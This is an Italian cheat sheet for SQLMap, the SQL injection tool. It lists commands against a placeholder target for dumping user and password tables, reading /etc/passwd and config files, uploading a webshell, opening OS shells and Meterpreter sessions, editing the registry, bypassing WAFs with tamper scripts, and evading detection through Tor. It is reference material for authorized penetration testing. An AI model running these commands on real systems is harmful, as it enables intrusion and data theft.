# 💉 SQLMap - Scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __
  / ___// __ \  / /   /  |/  /___ _____
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/
                               /_/
    Strumento automatico per SQL injection
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Lo strumento più potente per automatizzare la SQL injection</b>
</p>

> **Nota sugli esempi:** l’accesso ai file, al sistema operativo e al registro dipende dal DBMS, dai privilegi e dalla configurazione; gli script tamper non garantiscono un bypass universale. Anche il rischio 1 non è una garanzia di assenza di effetti, mentre il rischio 3 può introdurre test che modificano dati. I comandi originali sono conservati; vedi la [guida ufficiale](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

---

## 📋 Indice

- [Introduzione](#-introduzione)
- [Installazione](#-installazione)
- [Sintassi di base](#-sintassi-di-base)
- [Opzioni del bersaglio](#-opzioni-del-bersaglio)
- [Opzioni delle richieste](#-opzioni-delle-richieste)
- [Opzioni di rilevamento](#-opzioni-di-rilevamento)
- [Enumerazione](#-enumerazione)
- [Estrazione dei dati](#-estrazione-dei-dati)
- [Operazioni sui file](#-operazioni-sui-file)
- [Accesso al sistema operativo](#-accesso-al-sistema-operativo)
- [Tecniche di aggiramento](#-tecniche-di-aggiramento)
- [Script tamper](#riferimento-degli-script-tamper)
- [Esempi pratici](#-esempi-pratici)
- [Riferimento rapido](#-riferimento-rapido)
- [Consigli e buone pratiche](#-consigli-e-buone-pratiche)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**SQLMap** è uno strumento open source per il penetration testing che automatizza il rilevamento e lo sfruttamento delle vulnerabilità di SQL injection.

### Funzionalità principali

| Funzionalità | Descrizione |
|---------|-------------|
| **Rilevamento automatico** | Rileva automaticamente le vulnerabilità di SQL injection |
| **Database supportati** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite e altri |
| **Controllo completo** | Identificazione del database (fingerprinting), estrazione dei dati e accesso al sistema operativo |
| **Tecniche di aggiramento** | Aggiramento di WAF/IPS con script tamper (modifica dei payload) |
| **Più tipi di injection** | Basate su valori booleani, errori, UNION, query multiple e tempi di risposta |

### Database supportati

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Tipi di SQL injection

| Tipo | Codice | Descrizione |
|------|------|-------------|
| Blind basata su valori booleani | `B` | Risposte vero/falso |
| Basata sugli errori | `E` | Errori del database nella risposta |
| Basata su query UNION | `U` | Injection tramite UNION SELECT |
| Query multiple concatenate (stacked queries) | `S` | Più query (;) |
| Blind basata sui tempi di risposta | `T` | Ritardi nei tempi di risposta |
| Query inline | `Q` | Query inline (annidate) |

---

## 📥 Installazione

### Kali Linux (preinstallato)
```bash
# Aggiorna SQLMap
sudo apt update && sudo apt install sqlmap
```

### Da GitHub (versione più recente)
```bash
# Clona il repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Avvia SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Con pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Verifica dell'installazione
```bash
sqlmap --version
sqlmap -h          # Guida di base
sqlmap -hh         # Guida avanzata
```

---

## ⌨ Sintassi di base

### Sintassi generale
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Esempi per iniziare
```bash
# Scansione di base
sqlmap -u "http://target.com/page.php?id=1"

# Scansione con cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Scansione di una richiesta POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Scansione da file
sqlmap -r request.txt

# Modalità completamente automatica
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Opzioni del bersaglio

### URL del bersaglio (-u)
```bash
# URL di base
sqlmap -u "http://target.com/page.php?id=1"

# Più parametri
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Specifica il parametro da verificare
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Verifica tutti i parametri
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### File della richiesta (-r)
```bash
# Salva la richiesta di Burp Suite in un file
# Poi esegui la scansione:
sqlmap -r request.txt

# Esempio di file della richiesta:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google dork (-g)
```bash
# Cerca e verifica i risultati di Google
sqlmap -g "inurl:page.php?id="

# Con pagine specifiche
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Connessione diretta al database (-d)
```bash
# Collegati direttamente al database
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Elenco di bersagli (-m)
```bash
# File con più URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### File di configurazione (-c)
```bash
# Usa il file di configurazione
sqlmap -c sqlmap.conf
```

---

## 📡 Opzioni delle richieste

### Metodo HTTP e dati
```bash
# Dati POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Specifica il metodo
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Dati JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Un solo cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Più cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Carica i cookie da file
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Verifica il parametro del cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Header
```bash
# Header personalizzato
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Più header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# User-Agent casuale
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Autenticazione
```bash
# Autenticazione Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Autenticazione Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Autenticazione NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# Proxy HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Proxy SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Verifica Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Opzioni di rilevamento

### Livello e rischio
```bash
# Livello (1-5) - Numero di test
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Rischio (1-3) - Pericolosità dei test
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Consigliato per test approfonditi
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Livello | Test |
|-------|-------|
| 1 | Predefinito - Test di base |
| 2 | + Verifica dei cookie |
| 3 | + Verifica di User-Agent e Referer |
| 4 | + Più payload |
| 5 | + Tutti i payload |

| Rischio | Descrizione |
|------|-------------|
| 1 | Predefinito - Test considerati sicuri nell'originale |
| 2 | + Test onerosi basati sui tempi di risposta |
| 3 | + Test basati su OR (possono modificare i dati!) |

### Selezione delle tecniche
```bash
# Tecnica specifica
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Solo UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Solo booleana
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Solo basata sugli errori
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Solo basata sui tempi di risposta
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Solo query concatenate

# Più tecniche
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Tutte le tecniche (predefinito)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Ritardi
```bash
# Tempo per l'injection basata sui ritardi (predefinito: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Ritardo tra le richieste
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Thread
```bash
# Connessioni simultanee (predefinito: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Enumerazione

### Enumerazione dei database
```bash
# Ottieni il database corrente
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Ottieni l'utente corrente
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Verifica se l'utente è amministratore del database (DBA)
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Elenca tutti i database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Elenca tutti gli utenti
sqlmap -u "http://target.com/page.php?id=1" --users

# Elenca le password degli utenti
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Elenca i privilegi
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Elenca i ruoli
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Enumerazione delle tabelle
```bash
# Elenca le tabelle del database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Elenca tutte le tabelle
sqlmap -u "http://target.com/page.php?id=1" --tables

# Conta le righe delle tabelle
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Enumerazione delle colonne
```bash
# Elenca le colonne della tabella
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Cerca i nomi delle colonne
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Estrazione dello schema
```bash
# Estrai lo schema del database
sqlmap -u "http://target.com/page.php?id=1" --schema

# Escludi i database di sistema
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Estrazione dei dati

### Estrazione dei dati
```bash
# Estrai una tabella specifica
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Estrai colonne specifiche
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Estrai tutte le tabelle del database
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Estrai tutto
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Escludi i database di sistema
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limitare i risultati
```bash
# Prime 10 righe
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Righe 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Clausola WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Query SQL personalizzate
```bash
# Esegui una query SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Shell SQL interattiva
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Formati di output

> **Correzione dell’originale:** `--output-dir` sceglie la directory, non il formato HTML. Quest’ultimo è selezionato da `--dump-format`; la riga etichettata “Salva in HTML” conserva quindi un esempio incompleto. Vedi i [formati di estrazione documentati](https://github.com/sqlmapproject/sqlmap/wiki/Usage#format-of-dumped-data).
```bash
# Salva in CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Salva in HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 Operazioni sui file

### Lettura dei file
```bash
# Leggi un file dal server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Leggi file Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Leggi la configurazione web
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Scrittura dei file
```bash
# Scrivi un file sul server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Carica una webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 Accesso al sistema operativo

### Esecuzione di comandi
```bash
# Esegui un comando del sistema operativo
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Shell interattiva
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell su Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Sessione Meterpreter
```bash
# Ottieni una sessione Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Con opzioni specifiche
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB Relay
```bash
# Attacco SMB relay
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Accesso al registro (Windows)

> **Nota sulla sintassi:** il primo esempio usa `-reg-key` con un solo trattino; l’opzione documentata è `--reg-key`. Il refuso dell’originale è conservato nel comando.
```bash
# Leggi il registro
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Aggiungi una chiave al registro
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Elimina una chiave dal registro
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

## 🛡 Tecniche di aggiramento

### Aggiramento di WAF/IPS
```bash
# Identifica il WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Salta il rilevamento del WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Maiuscole e minuscole casuali
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Più script tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Script tamper comuni
```bash
# Codifica URL
--tamper=charencode

# Doppia codifica URL
--tamper=chardoubleencode

# Codifica Unicode
--tamper=charunicodeencode

# Sostituisci gli spazi con commenti
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Modifica di maiuscole e minuscole
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Sostituisci le parole chiave
--tamper=between
--tamper=equaltolike
```

### Riferimento degli script tamper

| Script | Descrizione |
|--------|-------------|
| `apostrophemask` | Sostituisce l'apostrofo con una rappresentazione UTF-8 |
| `apostrophenullencode` | Sostituisce l'apostrofo con doppia codifica Unicode |
| `base64encode` | Codifica il payload in Base64 |
| `between` | Sostituisce `>` con `NOT BETWEEN 0 AND #` |
| `charencode` | Codifica tutti i caratteri in formato URL |
| `charunicodeencode` | Codifica Unicode-URL |
| `concat2concatws` | Sostituisce `CONCAT` con `CONCAT_WS` |
| `equaltolike` | Sostituisce `=` con `LIKE` |
| `greatest` | Sostituisce `>` con `GREATEST` |
| `halfversionedmorekeywords` | Aggiunge un commento MySQL con versione |
| `ifnull2ifisnull` | Sostituisce `IFNULL` con `IF(ISNULL())` |
| `lowercase` | Converte le parole chiave in minuscolo |
| `modsecurityversioned` | Aggira ModSecurity con un commento con versione |
| `modsecurityzeroversioned` | Aggira ModSecurity con un commento con versione zero |
| `percentage` | Aggiunge il simbolo di percentuale prima dei caratteri |
| `randomcase` | Usa maiuscole e minuscole casuali nelle parole chiave |
| `randomcomments` | Aggiunge commenti casuali alle parole chiave SQL |
| `securesphere` | Aggiunge una stringa speciale per aggirare SecureSphere |
| `space2comment` | Sostituisce lo spazio con `/**/` |
| `space2dash` | Sostituisce lo spazio con un commento `--` |
| `space2hash` | Sostituisce lo spazio con un commento `#` |
| `space2morehash` | Sostituisce lo spazio con `#` e un ritorno a capo |
| `space2mssqlblank` | Sostituisce lo spazio con caratteri vuoti MSSQL |
| `space2mssqlhash` | Sostituisce lo spazio con `#` e un ritorno a capo (MSSQL) |
| `space2plus` | Sostituisce lo spazio con `+` |
| `space2randomblank` | Sostituisce lo spazio con un carattere vuoto casuale |
| `symboliclogical` | Sostituisce `AND`/`OR` con `&&`/`||` |
| `unionalltounion` | Sostituisce `UNION ALL` con `UNION` |
| `unmagicquotes` | Sostituisce l'apostrofo con il valore multibyte `%bf%27` |
| `uppercase` | Converte le parole chiave in maiuscolo |
| `versionedkeywords` | Racchiude le parole chiave in un commento con versione |
| `versionedmorekeywords` | Racchiude più parole chiave in un commento con versione |
| `xforwardedfor` | Aggiunge un header `X-Forwarded-For` fittizio |

---

## 🎬 Esempi pratici

### Esempio 1: Scansione di base
```bash
# Scansione in modalità automatica
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Esempio 2: Estrazione completa del database
```bash
# Enumera ed estrai
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Dopo aver individuato il database
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Estrai la tabella degli utenti
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Esempio 3: Richiesta POST con cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Esempio 4: Attraverso il proxy Burp
```bash
# Salva la richiesta di Burp in un file, poi:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Esempio 5: Aggiramento del WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Esempio 6: Ottenere una shell del sistema operativo
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Esempio 7: Lettura di file sensibili
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Riferimento rapido

### Comandi essenziali

| Comando | Descrizione |
|---------|-------------|
| `-u URL` | URL del bersaglio con parametro |
| `-r FILE` | Carica la richiesta da file |
| `--data=DATA` | Dati POST |
| `--cookie=COOKIE` | Cookie HTTP |
| `--dbs` | Elenca i database |
| `--tables` | Elenca le tabelle |
| `--columns` | Elenca le colonne |
| `--dump` | Estrai i dati |
| `-D DB` | Specifica il database |
| `-T TABLE` | Specifica la tabella |
| `-C COLS` | Specifica le colonne |
| `--batch` | Modalità non interattiva |

### Opzioni di rilevamento

| Opzione | Descrizione |
|--------|-------------|
| `--level=LEVEL` | Livello di test (1-5) |
| `--risk=RISK` | Livello di rischio (1-3) |
| `-p PARAM` | Parametro da verificare |
| `--technique=TECH` | Tecnica di injection |
| `--threads=N` | Thread simultanei |

### Opzioni di output

| Opzione | Descrizione |
|--------|-------------|
| `-v LEVEL` | Livello di dettaglio (0-6) |
| `--batch` | Non richiede mai input |
| `--flush-session` | Svuota la cache della sessione |
| `--output-dir=DIR` | Directory di output personalizzata |

---

## 💡 Consigli e buone pratiche

### Consigli sulle prestazioni

1. **Inizia con semplicità**
   ```bash
   # Inizia con un livello basso
   sqlmap -u "URL" --level=1 --batch
   # Aumenta se necessario
   ```

2. **Usa --batch per l'automazione**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Risparmia tempo con test specifici**
   ```bash
   # Verifica solo la tecnica basata su UNION
   sqlmap -u "URL" --technique=U
   ```

### Consigli per ridurre la visibilità

1. **User-Agent casuale**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Aggiungi un ritardo**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Usa Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Risoluzione dei problemi

| Problema | Soluzione |
|-------|----------|
| Nessuna injection rilevata | Aumenta `--level` e `--risk` |
| Blocco da parte del WAF | Usa gli script `--tamper` |
| Scansione lenta | Riduci `--level` e usa una `--technique` specifica |
| Problemi di connessione | Verifica `--timeout` e `--retries` |

---

## ⚠ Avvertenza legale

> **ATTENZIONE:** SQLMap è uno strumento potente da utilizzare soltanto per **test autorizzati**.
>
> - ✅ Esegui test sui sistemi di tua proprietà
> - ✅ Esegui test con un'autorizzazione scritta esplicita
> - ✅ Usalo in incarichi legali di penetration testing
> - ❌ Non usarlo mai su sistemi senza autorizzazione
> - ❌ Non usarlo mai per scopi malevoli
>
> **L'accesso non autorizzato ai sistemi informatici è illegale e punibile per legge.**

---

## 📚 Risorse

### Risorse ufficiali
- [Sito ufficiale di SQLMap](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Risorse per lo studio
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Schede correlate
- [Metasploit Framework](../../Metasploit/translations/README.it.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.it.md)

---

<p align="center">
  <b>💉 Padroneggia i test di SQL injection!</b><br>
  <i>Da grandi poteri derivano grandi responsabilità</i>
</p>
